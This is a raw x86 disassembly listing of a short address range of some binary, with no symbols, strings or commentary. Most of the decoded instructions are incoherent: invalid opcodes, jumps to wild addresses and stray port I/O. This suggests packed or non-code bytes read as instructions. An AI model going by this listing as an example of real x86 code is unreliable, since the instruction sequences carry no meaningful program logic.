  40219e:	adc    bh,bh
  4021a0:	int3   
  4021a1:	lock jmp 0x402174
  4021a4:	jle    0x40217e
  4021a6:	add    ecx,DWORD PTR [ebx]
  4021a8:	jns    0x4021cd
  4021aa:	jno    0x402139
  4021ac:	hlt    
  4021ad:	mov    al,0x34
  4021af:	push   0x39
  4021b1:	ins    BYTE PTR es:[edi],dx
  4021b2:	inc    edi
  4021b3:	hlt    
  4021b4:	mov    DWORD PTR ds:0xe7acff04,ecx
  4021ba:	loopne 0x402231
  4021bc:	sbb    eax,0xcf9d80
	...
  4021d1:	add    BYTE PTR [eax],al
  4021d3:	add    BYTE PTR [ecx],bh
  4021d5:	xlat   BYTE PTR ds:[ebx]
  4021d6:	or     al,0xc0
  4021d8:	test   BYTE PTR [ebx],dl
  4021da:	test   DWORD PTR [ebp+0x1],edi
  4021dd:	fcom   DWORD PTR [edi+0x46]
  4021e0:	mov    edx,0x6c01d7d4
  4021e5:	rol    DWORD PTR [ebp+edi*2+0x3a57d8f1],1
  4021ec:	mov    dl,0x94
  4021ee:	fild   DWORD PTR [eax-0x77]
  4021f1:	aas    
  4021f2:	inc    edx
  4021f3:	std    
  4021f4:	(bad)  
  4021f5:	cmp    cl,BYTE PTR [ebp-0x24634308]
  4021fb:	push   eax
  4021fc:	outs   dx,BYTE PTR ds:[esi]
  4021fd:	mov    ebp,0x12396a03
  402202:	push   edi
  402203:	adc    BYTE PTR [esi-0x4b17207c],dh
  402209:	adc    al,BYTE PTR [eax+eax*1]
  40220c:	xor    dl,BYTE PTR [edi]
  40220e:	pop    eax
  40220f:	or     al,BYTE PTR [esi]
  402211:	jmp    FWORD PTR [eax]
  402213:	std    
  402214:	xchg   esi,eax
  402215:	cli    
  402216:	sub    al,0xff
  402218:	mov    ds:0x2d458cd3,al
  40221d:	faddp  st(3),st
  40221f:	je     0x402255
  402221:	rcl    BYTE PTR [esi-0x8],cl
  402224:	mov    BYTE PTR [eax],0xe9
  402227:	loopne 0x40220d
  402229:	jecxz  0x4021fc
  40222b:	push   0x76
  40222d:	add    cl,ch
  40222f:	mov    WORD PTR [esi-0xb],?
  402232:	test   al,0x56
  402234:	xor    eax,0xfc447d
	...
  402249:	add    BYTE PTR [eax],al
  40224b:	add    BYTE PTR [eax],bh
  40224d:	ins    DWORD PTR es:[edi],dx
  40224e:	xlat   BYTE PTR ds:[ebx]
  40224f:	mov    esp,?
  402251:	pop    es
  402252:	sub    DWORD PTR [esi+edi*1],esi
  402255:	imul   edx,ebp,0xffffffe0
  402258:	lods   al,BYTE PTR ds:[esi]
  402259:	adc    BYTE PTR [esi+0x14e13d56],ah
  40225f:	or     al,0x11
  402261:	pop    ds
  402262:	xchg   esi,eax
  402263:	loopne 0x402283
  402265:	inc    ecx
  402266:	mov    al,ds:0x1c002dc5
  40226b:	lea    ebx,ds:0x380bfc7f
  402271:	add    cl,ch
  402273:	add    DWORD PTR [edi+esi*8+0x176c166d],0xffffffa8
  40227b:	add    edi,DWORD PTR [esi+0x396df13a]
  402281:	loope  0x40225f
  402283:	neg    edi
  402285:	push   0xfffffff9
  402287:	loopne 0x4022d5
  402289:	hlt    
  40228a:	inc    ebp
  40228b:	push   esi
  40228c:	inc    ecx
  40228d:	fdiv   DWORD PTR ds:0x20e0c6e1
  402293:	lds    ebp,FWORD PTR [ecx]
  402295:	add    BYTE PTR [edx],al
  402297:	(bad)
  40229b:	in     eax,0xf0
  40229d:	imul   al
  40229f:	add    edi,DWORD PTR [ecx]
  4022a1:	iret   
  4022a2:	add    edx,DWORD PTR [ebp+ebp*1+0x7f]
  4022a6:	sbb    edx,DWORD PTR [edx]
  4022a8:	stos   DWORD PTR es:[edi],eax
  4022a9:	xchg   esi,eax
  4022aa:	add    eax,0xd80e8b82
  4022af:	repnz add BYTE PTR [eax],al
	...
  4022c2:	add    BYTE PTR [eax],al
  4022c4:	sub    esi,ebx
  4022c6:	add    BYTE PTR [edi],al
  4022c8:	mov    bl,0xb
  4022ca:	test   DWORD PTR [ecx-0x25],edi
  4022cd:	ds add bh,ah
  4022d0:	jne    0x40233c
  4022d2:	fisubr DWORD PTR [edx+0x3eec7520]
  4022d8:	mov    dl,0x3a
  4022da:	or     dh,dl
  4022dc:	lea    esi,[ebp+edi*2-0xb]
  4022e0:	ret    
  4022e1:	xor    dl,BYTE PTR [eax]
  4022e3:	bnd jne 0x402351
  4022e6:	sbb    BYTE PTR [edx-0x7b],ah
  4022e9:	mov    esi,0x748e1ea
  4022ee:	and    eax,0x35a6
  4022f3:	jb     0x402326
  4022f5:	test   DWORD PTR [eax+0x8],esi
  4022f8:	je     0x4022fa
  4022fa:	xor    ebp,DWORD PTR [ebx+0x7ee8e27e]
  402300:	lds    edi,FWORD PTR [edi]
  402302:	leave  
  402303:	stos   DWORD PTR es:[edi],eax
  402304:	sub    DWORD PTR [eax],eax
  402306:	push   ebp
  402307:	bound  ecx,QWORD PTR [ecx]
  402309:	xor    al,0x83
  40230b:	in     al,dx
  40230c:	inc    edx
  40230d:	add    BYTE PTR [ebp-0x12],dh
  402310:	test   DWORD PTR [ebp+0x8],0x411551
  402317:	push   0x58
  402319:	or     al,0x0
  40231b:	aam    0x3f
  40231d:	mov    DWORD PTR [ebp-0xb],0xe94128e2
  402324:	out    0x55,eax
  402326:	or     BYTE PTR [ecx+0x0],al
	...
  402339:	add    BYTE PTR [eax],al
  40233b:	add    BYTE PTR [esi],bl
  40233d:	int    0x0
  40233f:	jmp    0x9d3fdc07
  402344:	ds call 0x7d4f7f
  40234a:	add    esi,DWORD PTR [ecx]
  40234c:	cli    
  40234d:	xor    ch,al
  40234f:	into   
  402350:	jbe    0x402331
  402352:	inc    DWORD PTR [eax]
  402354:	or     ebx,DWORD PTR [edi+edi*8-0x17ed778b]
  40235b:	aas    
  40235c:	push   ebp
  40235d:	add    al,0x0
  40235f:	(bad)  
  402360:	in     eax,dx
  402361:	push   cs
  402362:	push   ebx
  402363:	call   0x40d47c
  402368:	jmp    0x40232b
  40236a:	pop    ebx
  40236b:	leave  
  40236c:	xchg   edx,eax
  40236d:	or     eax,DWORD PTR [eax]
  40236f:	push   ebp
  402370:	fucomi st,st(6)
  402372:	push   ebx
  402373:	xor    ebp,0xb
  402376:	add    BYTE PTR [ebp+0x5f],dh
  402379:	mov    BYTE PTR [ebp+0x8],0x78
  40237d:	sub    eax,DWORD PTR [ecx+0x0]
  402380:	mov    ds:0x4d000c60,eax
  402385:	pop    es
  402386:	mov    DWORD PTR [ebp+0x14],0x104128eb
  40238d:	mov    esi,0xe9b80875
  402392:	int3   
  402393:	add    BYTE PTR [eax],ah
  402395:	mov    bl,al
  402397:	dec    DWORD PTR ds:0xd4e1e80f
  40239d:	add    al,BYTE PTR [eax]
  40239f:	add    eax,DWORD PTR [eax]
	...
  4023b1:	add    BYTE PTR [eax],al
  4023b3:	add    al,cl
  4023b5:	inc    ecx
  4023b6:	push   ebx
  4023b7:	call   0x3fde47
  4023bc:	imul   ebx,DWORD PTR [ebx+0x11d875ff],0xffffffe8
  4023c3:	jmp    0x4023f9
  4023c5:	add    eax,DWORD PTR [eax]
  4023c7:	dec    DWORD PTR [ebp+0x68e8530e]
  4023cd:	iret   
  4023ce:	add    BYTE PTR [eax],al
  4023d0:	pop    es
  4023d1:	cmp    BYTE PTR [eax],cl
  4023d3:	call   0x3fde00
  4023d8:	sub    eax,edx
  4023da:	pop    ebx
  4023db:	leave  
  4023dc:	push   edx
  4023dd:	or     eax,DWORD PTR [eax]
  4023df:	push   ebp
  4023e0:	cmp    DWORD PTR [edx-0x11],esp
  4023e3:	cmp    DWORD PTR [ebp+0xc],0x36
  4023e7:	push   0x3e834
  4023ec:	xchg   ecx,eax
  4023ed:	adc    eax,0x5f7effda
  4023f2:	dec    eax
  4023f3:	cld    
  4023f4:	mov    edx,0xf82976ab
  4023f9:	call   0xb27b9901
  4023fe:	idiv   dh
  402400:	in     al,0xb4
  402402:	push   0x0
  402404:	jecxz  0x4023ee
  402406:	fdiv   QWORD PTR [ebp+0x41]
  402409:	xor    eax,DWORD PTR [edi+edi*8]
  40240c:	sub    al,0x36
  40240e:	sub    eax,DWORD PTR [ecx+0x39]
  402411:	ins    BYTE PTR es:[edi],dx
  402412:	les    edi,FWORD PTR [ecx-0x7f]
  402415:	scas   al,BYTE PTR es:[edi]
  402416:	push   edi
  402417:	cld    
	...
  40242c:	and    esp,edi
  40242e:	fdivr  st,st(7)
  402430:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  402432:	inc    edi
  402433:	cld    
  402434:	cmp    edi,esp
  402436:	add    eax,DWORD PTR [eax]
  402438:	(bad)  
  402439:	push   edx
  40243a:	sub    eax,DWORD PTR [ecx+0x39]
  40243d:	jb     0x40246e
  40243f:	mov    ebp,DWORD PTR [esi]
  402441:	push   edx
  402442:	inc    edi
  402443:	or     BYTE PTR [esi+edx*2+0x5d],dl
  402447:	push   esi
  402449:	nop
  40244a:	inc    ecx
  40244b:	add    al,0x64
  40244d:	add    ch,BYTE PTR [edx+0x0]
  402450:	mov    ah,0xa9
  402452:	or     edx,DWORD PTR [eax+0x51]
  402455:	dec    esi
  402456:	sub    al,BYTE PTR [ecx+0x39]
  402459:	dec    esi
  40245a:	adc    ch,al
  40245c:	ins    BYTE PTR es:[edi],dx
  40245d:	inc    ebp
  40245e:	(bad)  
  402460:	xor    ah,BYTE PTR [edi]
  402462:	pop    eax
  402463:	add    eax,0xebdfacb0
  402468:	inc    ecx
  402469:	push   0xffffffc5
  40246b:	add    al,0xba
  40246d:	add    dh,ah
  40246f:	add    ebp,DWORD PTR [esi+ecx*8]
  402472:	jb     0x4024bb
  402474:	popf   
  402475:	cmp    eax,0x3dc220
  40247a:	mov    ah,0x88
  40247c:	popf   
  40247d:	xor    DWORD PTR [edx+0x47],esi
  402480:	xor    DWORD PTR [ecx],ecx
  402482:	sub    DWORD PTR [eax+0x34],ebx
  402485:	xor    BYTE PTR [ecx+0x3109ec03],0x4
  40248c:	cmp    DWORD PTR [eax],eax
  40248e:	jmp    0x4024cb
	...
  4024a3:	add    BYTE PTR [eax-0x3e],dh
  4024a6:	in     eax,0x3
  4024a8:	sar    edi,cl
  4024aa:	inc    edx
  4024ab:	add    al,0xe3
  4024ad:	add    BYTE PTR [ebx+0x4],al
  4024b0:	jecxz  0x4024b1
  4024b2:	push   eax
  4024b3:	test   BYTE PTR [ecx],bh
  4024b5:	add    cl,ch
  4024b7:	fadd   st(4),st
  4024b9:	pop    es
  4024ba:	shl    esp,0x2
  4024bd:	add    cl,ch
  4024bf:	mov    BYTE PTR [ecx],dl
  4024c1:	sub    DWORD PTR [ecx+0x3a09ad40],ebp
  4024c7:	in     al,dx
  4024c8:	pop    ss
  4024c9:	leave  
  4024ca:	jmp    0xe93ef5d2
  4024cf:	add    edi,DWORD PTR [ecx]
  4024d1:	cmp    DWORD PTR [eax+0x14003dc1],esi
  4024d7:	mov    DWORD PTR ds:0x420c2c89,ecx
  4024dd:	shl    ch,0x6
  4024e0:	mov    ecx,0x3056e917
  4024e5:	cwde   
  4024e6:	jmp    0x20405dee
  4024eb:	sar    DWORD PTR ds:0x41564e00,0xe8
  4024f2:	cmp    ecx,eax
  4024f4:	cmp    DWORD PTR [eax],eax
  4024f6:	push   0xffffffdb
  4024f8:	mov    esi,0xe3e40053
  4024fd:	out    dx,eax
  4024fe:	(bad)  
  4024ff:	call   0x29d5323e
  402504:	xor    eax,0x12c096
	...
  402519:	add    BYTE PTR [eax],al
  40251b:	add    BYTE PTR [edi],dh
  40251d:	cwde   
  40251e:	add    cl,ch
  402520:	cmp    al,BYTE PTR [eax]
  402522:	leave  
  402523:	sub    esi,DWORD PTR [esi]
  402525:	add    BYTE PTR [ebp+0x72],dl
  402528:	xchg   esi,eax
  402529:	add    ah,0xfd
  40252c:	adc    DWORD PTR [eax],eax
  40252e:	push   0xffffffe9
  402530:	xchg   ebp,eax
  402531:	push   edx
  402532:	or     BYTE PTR [ecx],al
  402534:	or     eax,0xc037e900
  40253a:	je     0x40254f
  40253c:	and    eax,0x778ae830
  402541:	fdiv   st(7),st
  402543:	pusha  
  402544:	clc    
  402545:	fistp  DWORD PTR [eax+0x19]
  402548:	bound  edx,QWORD PTR [edx-0x4]
  40254b:	mov    esi,0x79e807e8
  402550:	push   es
  402551:	add    DWORD PTR [eax],eax
  402553:	loop   0x40254f
  402555:	push   ebp
  402556:	or     al,0xa6
  402558:	mov    ah,bl
  40255a:	call   0x1c2478
  40255f:	ret    0xe7fa
  402562:	add    esp,DWORD PTR [edx+0x78]
  402565:	fmul   st(1),st
  402567:	stos   DWORD PTR es:[edi],eax
  402568:	cmp    DWORD PTR [eax],eax
  40256a:	push   ebp
  40256b:	jb     0x40257e
  40256d:	xor    BYTE PTR [ebx+0x10664114],cl
  402573:	sbb    bl,ch
  402575:	test   dl,bh
  402577:	data16 add ah,BYTE PTR [edi+0x0]
  40257b:	sar    DWORD PTR [edx],cl
  40257d:	add    ax,bx
	...
  402594:	cmp    ah,BYTE PTR [esi+0x3]
  402597:	sar    DWORD PTR [edx],0x0
  40259a:	add    BYTE PTR [eax],al
  40259c:	push   eax
  40259d:	mov    bh,0x75
  40259f:	or     BYTE PTR [eax+0x2b],ch
  4025a2:	retf   
  4025a3:	add    BYTE PTR [eax-0x1bbffc74],ah
  4025a9:	adc    ebp,DWORD PTR [edx+0x0]
  4025ac:	loopne 0x402595
  4025ae:	ins    BYTE PTR es:[edi],dx
  4025af:	retf   
  4025b0:	nop
  4025b1:	dec    DWORD PTR [eax+0x6d9c43]
  4025b7:	push   0xffffffa0
  4025b9:	ins    DWORD PTR es:[edi],dx
  4025ba:	add    BYTE PTR [edx-0x6e],ch
  4025bd:	ins    DWORD PTR es:[edi],dx
  4025be:	add    bh,bh
  4025c0:	ret    
  4025c1:	out    0x5e,eax
  4025c3:	retf   
  4025c4:	pusha  
  4025c5:	dec    DWORD PTR [edx]
  4025c7:	shl    ah,0x25
  4025ca:	mov    DWORD PTR [ebx+0x54],eax
  4025cd:	ins    DWORD PTR es:[edi],dx
  4025ce:	add    BYTE PTR [edx+0x50],ch
  4025d1:	ins    DWORD PTR es:[edi],dx
  4025d2:	add    BYTE PTR [edx+0x64],ch
  4025d5:	psubsb mm1,QWORD PTR [edi-0x65]
  4025d9:	(bad)  
  4025da:	dec    DWORD PTR [eax-0x3ff4f3ed]
  4025e0:	add    eax,0x2473ff20
  4025e5:	out    0xf2,eax
  4025e7:	retf   0xff20
  4025ea:	(bad)  
  4025eb:	xor    ecx,eax
  4025ed:	jmp    0xbe5026bc
  4025f2:	add    edi,edi
  4025f4:	scas   eax,DWORD PTR es:[edi]
  4025f5:	mov    ch,0xff
  4025f7:	jmp    0x4025f9
	...
  402609:	add    BYTE PTR [eax],al
  40260b:	add    ch,ch
  40260d:	mov    ch,0x33
  40260f:	call   0x40f2f0
  402614:	xlat   BYTE PTR ds:[ebx]
  402615:	add    edi,edi
  402617:	jmp    FWORD PTR [edi-0x4a]
  40261a:	sub    eax,eax
  40261c:	test   eax,0x650f0841
  402621:	mov    edi,0x712c95b
  402626:	add    BYTE PTR [ebp+0x39],dl
  402629:	pop    esi
  40262a:	out    0x53,eax
  40262c:	ret    0xbab
  40262f:	add    DWORD PTR [edx],0x42
  402632:	dec    edi
  402633:	pop    ss
  402634:	mov    esi,0x40e80b95
  402639:	push   ds
  40263a:	add    eax,DWORD PTR [eax]
  40263c:	scas   al,BYTE PTR es:[edi]
  40263d:	xchg   ebp,eax
  40263e:	jmp    edi
  402640:	aam    0xe
  402642:	add    eax,DWORD PTR [eax]
  402644:	sahf   
  402645:	mov    ch,0xeb
  402647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402648:	sub    eax,0x3
  40264b:	pop    ebx
  40264c:	and    BYTE PTR [esi],0xff
  40264f:	(bad)  
  402650:	in     eax,dx
  402651:	dec    ebp
  402652:	out    0x81,eax
  402654:	jne    0x40265e
  402656:	jmp    0x2c83:0x327a76ff
  40265d:	cmp    ebp,DWORD PTR [ebx]
  40265f:	inc    ecx
  402660:	cmp    ecx,ebp
  402662:	dec    edi
  402663:	adc    eax,0x2889f35e
  402668:	clc    
  402669:	call   0xc990b159
  40266e:	fld    st(7)
	...
  402684:	cmp    al,0x53
  402686:	sub    al,0x41
  402688:	cmp    ecx,ebp
  40268a:	add    eax,DWORD PTR [eax]
  40268c:	cmp    DWORD PTR [esi+0x17],esp
  40268f:	xchg   edx,eax
  402690:	popa   
  402691:	sub    BYTE PTR [eax+eax*1],al
  402694:	lods   eax,DWORD PTR ds:[esi]
  402695:	(bad)  
  402697:	xor    eax,0x42afcb
  40269c:	and    DWORD PTR [ebx+ebx*8],eax
  40269f:	dec    DWORD PTR [esi]
  4026a1:	mov    ds:0x285191ff,eax
  4026a6:	add    al,0x0
  4026a8:	cmp    edi,esp
  4026aa:	add    ecx,DWORD PTR [ebp-0x16a844]
  4026b0:	out    dx,al
  4026b1:	imul   ebx
  4026b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026b4:	jmp    0xad198cb9
  4026b9:	or     DWORD PTR [ebp-0x17],0xffffffd6
  4026bd:	fnstcw WORD PTR [ecx+0x4ed0b3eb]
  4026c3:	fnstenv [ebx+eax*2+0x72513445]
  4026ca:	adc    DWORD PTR [ebx+0x39],eax
  4026cd:	push   0x803903eb
  4026d2:	inc    ecx
  4026d3:	jno    0x402747
  4026d5:	add    cl,ch
  4026d7:	or     al,0x79
  4026d9:	or     DWORD PTR [ebp+edi*1+0x38],esp
  4026dd:	add    cl,ch
  4026df:	shl    BYTE PTR [esp+edx*8+0x86d8fe],0xe9
  4026e7:	add    eax,DWORD PTR [eax]
	...
  4026f9:	add    BYTE PTR [eax],al
  4026fb:	add    BYTE PTR [ecx],bh
  4026fd:	shl    DWORD PTR [esp+ebx*8+0x66],0xd9
  402702:	neg    al
  402704:	ds add cl,ch
  402707:	ins    DWORD PTR es:[edi],dx
  402708:	cmp    DWORD PTR [esi-0x17],esp
  40270b:	ins    DWORD PTR es:[edi],dx
  40270c:	cmp    DWORD PTR [esi-0x17],esp
  40270f:	xchg   BYTE PTR [eax+ebx*8+0x304ed8c6],bh
  402716:	pop    esp
  402717:	jle    0x40275e
  402719:	jmp    0xd929ffe4
  40271e:	je     0x4026ef
  402720:	fnstenv es:[esi-0x3e235b28]
  402727:	ss repnz (bad) 
  40272a:	call   0x6449203b
  40272f:	hlt    
  402730:	cmp    DWORD PTR [eax],eax
  402732:	jmp    0x28683ea2
  402737:	add    al,0x91
  402739:	jb     0x40270c
  40273b:	inc    edx
  40273c:	cmp    eax,ebp
  40273e:	(bad)  
  40273f:	xlat   BYTE PTR ds:[ebx]
  402740:	neg    al
  402742:	add    dl,ah
  402744:	cli    
  402745:	or     BYTE PTR [eax+edi*2+0x7200003a],al
  40274c:	stos   BYTE PTR es:[edi],al
  40274d:	mov    al,BYTE PTR [ebp-0x271ea3]
  402753:	mov    ecx,0x4dbce804
  402758:	loope  0x402732
  40275a:	or     ebp,DWORD PTR [ecx]
  40275c:	xor    DWORD PTR [edx+ebx*8+0xe9],eax
	...
  402773:	add    BYTE PTR [edx],bh
  402775:	add    BYTE PTR [ecx-0x176594],cl
  40277b:	cs mov edi,0x8116e882
  402781:	fcom   DWORD PTR [eax-0x6f]
  402784:	test   BYTE PTR [edi],ah
  402786:	inc    ecx
  402787:	jmp    0xff20b9fd
  40278c:	outs   dx,BYTE PTR ds:[esi]
  40278d:	fsubr  DWORD PTR [eax-0x15]
  402790:	cmp    al,BYTE PTR [eax]
  402792:	adc    BYTE PTR [ecx],0xc9
  402795:	aam    0xff
  402797:	test   BYTE PTR [edx-0x40],0xf
  40279b:	gs (bad) 
  40279d:	(bad)  
  40279e:	(bad)  
  40279f:	call   0xee41ff5f
  4027a4:	aam    0x7b
  4027a6:	add    cl,ch
  4027a8:	cmp    dh,BYTE PTR [eax]
  4027aa:	call   DWORD PTR [ebp+edx*2+0x5c6ffe8]
  4027b1:	fnstenv [ebp-0x27e147]
  4027b7:	shr    DWORD PTR [ecx*8+0x7db0aeff],0xe8
  4027bf:	xchg   esi,eax
  4027c0:	push   es
  4027c1:	fcom   DWORD PTR [eax+0x11]
  4027c4:	shr    DWORD PTR [eax],cl
  4027c6:	inc    ecx
  4027c7:	jmp    0x7f20b5b3
  4027cc:	out    dx,al
  4027cd:	xlat   BYTE PTR ds:[ebx]
  4027ce:	push   0x41200
  4027d3:	or     al,0x47
  4027d6:	sti    
  4027d7:	inc    DWORD PTR [eax]
	...
  4027e9:	add    BYTE PTR [eax],al
  4027eb:	add    BYTE PTR [edi+0xb],ah
  4027ee:	shl    BYTE PTR [esp+ebx*1-0x7d],0xbd
  4027f3:	call   0x23fd77f
  4027f8:	out    dx,al
  4027f9:	cli    
  4027fa:	dec    edi
  4027fb:	push   eax
  4027fc:	push   ebp
  4027fd:	cmp    esp,0x50af77ef
  402803:	call   0x40ec90
  402808:	ror    BYTE PTR [eax-0x5108037b],1
  40280e:	call   DWORD PTR [eax+0x57]
  402811:	jno    0x4027ff
  402813:	out    dx,eax
  402814:	push   edi
  402815:	scas   eax,DWORD PTR es:[edi]
  402816:	call   0xffef54ea
  40281b:	pop    eax
  40281c:	daa    
  40281d:	jno    0x402807
  40281f:	out    dx,eax
  402820:	aaa    
  402821:	scas   eax,DWORD PTR es:[edi]
  402822:	push   eax
  402823:	(bad)  
  402824:	cmp    eax,0x77ffefe8
  402829:	jmp    0x4027e7
  40282b:	hlt    
  40282c:	scas   al,BYTE PTR es:[di]
  40282e:	call   0xffee904c
  402833:	jmp    0x402865
  402835:	mov    DWORD PTR [ebp-0x517804],eax
  40283b:	push   eax
  40283c:	js     0x40283c
  40283e:	enter  0x5000,0x43
  402842:	push   eax
  402843:	(bad)  
  402844:	int    0xae
  402846:	out    dx,eax
  402847:	push   edi
  402849:	adc    bh,bh
  40284b:	mov    ch,0xf4
  40284d:	(bad)  
  40284f:	inc    DWORD PTR [eax]
	...
  402861:	add    BYTE PTR [eax],al
  402863:	add    al,bh
  402865:	dec    edi
  402866:	hlt    
  402867:	call   edi
  402869:	jmp    0xb5ff:0xadb7f7f2
  402870:	cmp    DWORD PTR [ecx-0x7ef9001a],ecx
  402876:	fdivrp st(7),st
  402878:	(bad)  
  402879:	jge    0x402851
  40287b:	test   ebp,ebp
  40287d:	test   esi,edx
  40287f:	jmp    eax
  402881:	adc    eax,0x65e6ffd5
  402886:	push   eax
  402887:	cld    
  402888:	shr    esi,1
  40288a:	leave  
  40288b:	add    BYTE PTR [ecx],bh
  40288d:	mov    bl,0x3
  40288f:	inc    DWORD PTR [eax+edi*1+0x40c6ffe6]
  402896:	xor    esi,esp
  402898:	mov    esi,0xb600693d
  40289d:	dec    ebx
  40289e:	out    0xef,eax
  4028a0:	scas   al,BYTE PTR es:[edi]
  4028a1:	or     eax,0x25ad43eb
  4028a6:	(bad)  
  4028a7:	lea    esi,[esp+eax*1-0x6769001a]
  4028ae:	(bad)  
  4028af:	mov    ch,0x89
  4028b1:	std    
  4028b2:	aad    0xff
  4028b4:	xchg   ecx,eax
  4028b5:	sbb    cl,ah
  4028b7:	add    BYTE PTR [ecx],bh
  4028b9:	fs ret 
  4028bb:	js     0x4028bf
  4028bd:	(bad)  
  4028be:	(bad)  
  4028bf:	lock pop esi
  4028c1:	int    0xd5
  4028c3:	call   0x15fece
	...
  4028dc:	mov    al,0x63
  4028de:	in     al,dx
  4028df:	out    dx,eax
  4028e0:	push   esi
  4028e1:	mov    ch,0xd5
  4028e3:	mov    ch,0x61
  4028e5:	mov    ebp,0x6551ffd5
  4028ea:	int    0xff
  4028ec:	mov    DWORD PTR ds:[esi-0x2b1887d8],eax
  4028f3:	mov    ch,0x15
  4028f5:	mov    edi,0x6a11ffd5
  4028fa:	int3   
  4028fb:	add    BYTE PTR [ecx],bh
  4028fd:	add    dl,dh
  4028ff:	ret    
  402900:	(bad)  
  402901:	stc    
  402902:	jno    0x40288b
  402904:	and    esi,esp
  402906:	xchg   esi,eax
  402907:	aad    0xb2
  402909:	shl    BYTE PTR [edx+0x17],1
  40290c:	scas   eax,DWORD PTR es:[edi]
  40290d:	sub    BYTE PTR [eax],ch
  40290f:	add    al,0xea
  402911:	pushf  
  402912:	jle    0x4028a3
  402914:	aad    0xe5
  402916:	jbe    0x4028ed
  402918:	shl    DWORD PTR [edi-0x5f],1
  40291b:	add    al,0x39
  40291d:	sub    DWORD PTR [eax+eiz*8-0x1a],0xffffffd5
  402922:	pop    esi
  402923:	xor    al,0xce
  402925:	mov    eax,DWORD PTR [ebp-0x1b]
  402928:	(bad)  
  402929:	aad    0x41
  40292b:	push   ebx
  40292c:	lock add cl,ch
  40292f:	jle    0x4029aa
  402931:	pop    eax
  402932:	mov    dl,0xd4
  402934:	in     al,0xe4
  402936:	inc    esi
  402937:	aad    0xa6
  402939:	call   0xd5df0f6d
  40293e:	jo     0x4029bf
	...
  402954:	mov    eax,ds:0x8ed51ee5
  402959:	mov    eax,DWORD PTR [ecx]
  40295b:	in     eax,0x86
  40295d:	aad    0x1
  40295f:	push   ss
  402960:	xchg   ch,dl
  402962:	push   es
  402963:	mov    eax,ds:0x3a828cb
  402968:	outs   dx,BYTE PTR ds:[esi]
  402969:	mov    ecx,DWORD PTR ds:0x1d566e5
  40296f:	and    esi,DWORD PTR [ecx+0x0]
  402972:	jmp    0x28ca27f
  402977:	mov    DWORD PTR [eax+ebp*8-0x76b92b3a],edi
  40297e:	(bad)  [eax+0x431171fc]
  402984:	cmp    ecx,edx
  402986:	test   esp,edx
  402988:	in     al,0xdb
  40298a:	add    dh,al
  40298c:	or     eax,0xf2e1e8d5
  402991:	(bad)  
  402992:	jmp    DWORD PTR [ebp-0x61103039]
  402998:	in     eax,0xe7
  40299a:	pop    edx
  40299b:	xchg   ebp,ebp
  40299d:	aam    0xff
  40299f:	push   esp
  4029a0:	push   ss
  4029a1:	in     eax,0xff
  4029a3:	xchg   dl,ah
  4029a5:	inc    esp
  4029a6:	out    dx,al
  4029a7:	jle    0x4029ae
  4029a9:	xor    eax,0x2af9a05e
  4029ae:	mov    edi,DWORD PTR [ebp+0x50]
  4029b1:	or     al,ch
  4029b3:	push   edx
  4029b4:	add    al,0xd5
  4029b6:	push   DWORD PTR [edx+0x0]
	...
  4029c9:	add    BYTE PTR [eax],al
  4029cb:	add    BYTE PTR [edx+0x124535d4],cl
  4029d1:	aas    
  4029d2:	add    BYTE PTR [esi+0x38],bl
  4029d5:	aad    0x75
  4029d7:	icebp  
  4029d8:	mov    ebp,0x9f700441
  4029dd:	call   0xc77ad20a
  4029e2:	ret    0x3ae5
  4029e5:	sub    ecx,DWORD PTR [ebx-0x74446eb]
  4029eb:	mov    dh,0xcd
  4029ed:	cmp    bh,al
  4029ef:	jmp    0x6a402a2e
  4029f4:	out    0x7,eax
  4029f6:	add    BYTE PTR [ebp+0x68],bh
  4029f9:	aad    0x75
  4029fb:	in     eax,dx
  4029fc:	test   DWORD PTR [edx+0x8],ecx
  4029ff:	cmp    DWORD PTR [edx],0xffffffe8
  402a02:	push   es
  402a03:	repz mov dl,ah
  402a06:	mov    DWORD PTR [ecx+ebp*2],ebp
  402a09:	call   0xd440d015
  402a0e:	add    cl,ch
  402a10:	cmp    al,BYTE PTR [eax]
  402a12:	mov    ecx,DWORD PTR [ecx+ebx*2]
  402a15:	daa    
  402a16:	inc    ecx
  402a17:	add    BYTE PTR [eax],ah
  402a19:	mov    bl,0x13
  402a1b:	mov    edx,DWORD PTR [ebp-0x50]
  402a1e:	cmp    eax,DWORD PTR [edi+0x14]
  402a21:	cmp    DWORD PTR [ecx],ecx
  402a23:	(bad)  
  402a24:	push   ebp
  402a25:	les    eax,FWORD PTR [ecx]
  402a27:	add    BYTE PTR [eax],ah
  402a29:	add    bl,ch
  402a2b:	push   es
  402a2c:	mov    ebp,edi
  402a2e:	or     bh,bh
	...
  402a44:	and    eax,0xa87d83b5
  402a49:	cld    
  402a4a:	je     0x402a54
  402a4c:	mov    edi,0x62e8fc39
  402a51:	scas   eax,DWORD PTR es:[edi]
  402a52:	(bad)  
  402a53:	call   FWORD PTR [ebx+0x49]
  402a56:	clc    
  402a57:	pop    edi
  402a58:	cdq    
  402a59:	mov    edx,0x52970008
  402a5e:	cmp    eax,0x3d28ec
  402a63:	jmp    0x402a3d
  402a65:	push   ss
  402a66:	mov    edi,DWORD PTR [edi]
  402a68:	js     0x402ab1
  402a6a:	idiv   bh
  402a6c:	call   edx
  402a6e:	(bad)  
  402a6f:	jne    0x402ad5
  402a71:	mov    DWORD PTR ds:0x3d38ec,0xffff9000
  402a7b:	pop    esi
  402a7c:	arpl   WORD PTR [ecx],bx
  402a7e:	mov    ebp,esp
  402a80:	(bad)  
  402a81:	sbb    DWORD PTR [edx+0x0],ebp
  402a84:	das    
  402a85:	cmp    DWORD PTR [eax],ecx
  402a87:	call   0x3fefe3
  402a8c:	jmp    0x402a51
  402a8e:	push   DWORD PTR [ebp+0x68]
  402a91:	mov    bh,0x22
  402a93:	(bad)  
  402a94:	push   eax
  402a95:	inc    DWORD PTR [edx+0xf3951f8]
  402a9b:	push   edi
  402a9c:	loopne 0x402a8b
  402a9e:	and    DWORD PTR [ebp+0x48],esi
  402aa1:	ret    
  402aa2:	lea    esi,[edi+0x39]
  402aa5:	call   0x40f328
	...
  402aba:	add    BYTE PTR [eax],al
  402abc:	dec    edx
  402abd:	jge    0x402af1
  402abf:	push   0x44f092
  402ac4:	xchg   BYTE PTR [ecx-0x16c63792],dh
  402aca:	(bad)  
  402acb:	mov    edi,0x40c9dda5
  402ad0:	cmp    eax,0xa35c5de9
  402ad5:	jmp    0xa0f71314
